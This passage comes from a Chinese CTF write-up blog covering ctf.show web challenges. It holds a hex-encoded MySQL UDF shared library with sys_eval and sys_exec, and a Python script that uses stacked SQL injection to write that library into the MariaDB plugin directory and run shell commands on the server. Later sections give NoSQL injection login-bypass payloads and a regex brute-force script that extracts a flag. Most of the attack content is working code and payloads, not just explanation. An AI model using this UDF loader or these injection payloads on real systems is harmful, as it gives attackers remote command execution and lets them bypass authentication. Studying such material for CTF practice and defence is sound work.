C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;</span></span><br><span class="line">codes=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(code),<span class="number">128</span>):</span><br><span class="line">    codes.append(code[i:<span class="built_in">min</span>(i+<span class="number">128</span>,<span class="built_in">len</span>(code))])</span><br><span class="line"> </span><br><span class="line"><span class="comment">#建临时表</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#清空临时表</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#插入第一段数据</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[<span class="number">0</span>])</span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#更新连接剩余数据</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(codes)):</span><br><span class="line">    sql=<span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[k])</span><br><span class="line">    payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">    requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#10.3.18-MariaDB    </span></span><br><span class="line"><span class="comment">#写入so文件</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#引入自定义函数</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#命令执行，结果更新到界面</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.her?&#x27;))&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#查看结果</span></span><br><span class="line">r=requests.get(url[:-<span class="number">4</span>]+<span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h1><h2 id="nosql"><a href="#nosql" class="headerlink" title="nosql"></a>nosql</h2><p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/609">NoSQL注入小笔记</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/97211">冷门知识 — NoSQL注入知多少</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$gt : &gt;</span><br><span class="line">$lt : &lt;</span><br><span class="line">$gte: &gt;=</span><br><span class="line">$lte: &lt;=</span><br><span class="line">$ne : !=、&lt;&gt;</span><br><span class="line">$in : in</span><br><span class="line">$nin: not in</span><br><span class="line">$all: all </span><br><span class="line">$or:or</span><br><span class="line">$not: 反匹配(1.3.3及以上版本)</span><br><span class="line">模糊查询用正则式：db.customer.find(&#123;&#x27;name&#x27;: &#123;&#x27;$regex&#x27;:&#x27;.*s.*&#x27;&#125; &#125;)</span><br><span class="line">/**</span><br><span class="line">* : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;</span><br><span class="line">* : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;</span><br><span class="line">* : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;</span><br><span class="line">*/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//查询age = 22的记录</span><br><span class="line">db.userInfo.find(&#123;&quot;age&quot;: 22&#125;);</span><br><span class="line">//相当于：select * from userInfo where age = 22;</span><br><span class="line">//查询age &gt; 22的记录</span><br><span class="line">db.userInfo.find(&#123;age: &#123;$gt: 22&#125;&#125;);</span><br><span class="line">//相当于：select * from userInfo where age &gt; 22;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409144401500.png" alt="image-20220409144401243"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409144445953.png" alt="image-20220409144445953"></p>
<p>这题后端对id过滤了非数字，可能用的intval函数。这个函数在PHP特性那里出现过很多次了，利用这个特性：</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409144506190.png" alt="image-20220409144506190"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id[]=flag</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409144557902.png" alt="image-20220409144557902"></p>
<h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409144722019.png" alt="image-20220409144722019"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  $query = new MongoDB\Driver\Query($data);</span><br><span class="line">  $cursor = $manager-&gt;executeQuery(&#x27;ctfshow.ctfshow_user&#x27;, $query)-&gt;toArray();</span><br><span class="line"></span><br><span class="line">//无过滤</span><br><span class="line">  if(count($cursor)&gt;0)&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">    array_push($ret[&#x27;data&#x27;], $flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>没有任何的过滤，利用<code>$ne</code>就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<p>正则也可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$regex]=.*&amp;password[$regex]=.*</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409150349590.png" alt="image-20220409150349590"></p>
<h1 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409150536078.png" alt="image-20220409150536078"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409150527537.png" alt="image-20220409150527537"></p>
<p>这次返回的是admin 的密码</p>
<p>改成username不等于admin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=admin&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409150627591.png" alt="image-20220409150627591"></p>
<h1 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=admin&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409151108797.png" alt="image-20220409151108797"></p>
<p>username既不能是admin，也不能是admin1，那就正则表达式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$regex]=^[^a].*$&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409151155741.png" alt="image-20220409151155741"></p>
<h1 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409151505085.png" alt="image-20220409151505085"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mongodb的find().pretty()方法的作用。</span><br><span class="line">使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑。</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author : feng</span></span><br><span class="line"><span class="string">Time : 2021-2-14</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://2184e9b4-619a-43dd-b8de-015a6a74fe3d.chall.ctf.show:8080/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;&#123;-abcdefghijklmnopqrstuvwxyz0123456789&#125;&quot;</span>:</span><br><span class="line">        payload=<span class="string">&quot;^&#123;&#125;.*$&quot;</span>.<span class="built_in">format</span>(flag+j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username[$regex]&#x27;</span>:<span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password[$regex]&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u767b\u9646\u6210\u529f&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://ego00.blog.csdn.net/">bfengj</a></p>
<p><a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/">Y4tacker</a></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/ctf-show/">ctf.show</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/44659fed.html"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2015/10/30/20/13/sea-1014710_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PHP特性</div></div></a></div><div class="next-post pull-right"><a href="/813434cb.html"><img class="next-cover" src="https://cdn.pixabay.com/photo/2016/04/20/19/47/wolves-1341881_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SSRF</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/3a28db8e.html" title="CMS"><img class="cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">CMS</div></div></a></div><div><a href="/1bb08f7b.html" title="JWT"><img class="cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">JWT</div></div></a></div><div><a href="/813434cb.html" title="SSRF"><img class="cover" src="https://cdn.pixabay.com/photo/2016/04/20/19/47/wolves-1341881_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">SSRF</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div 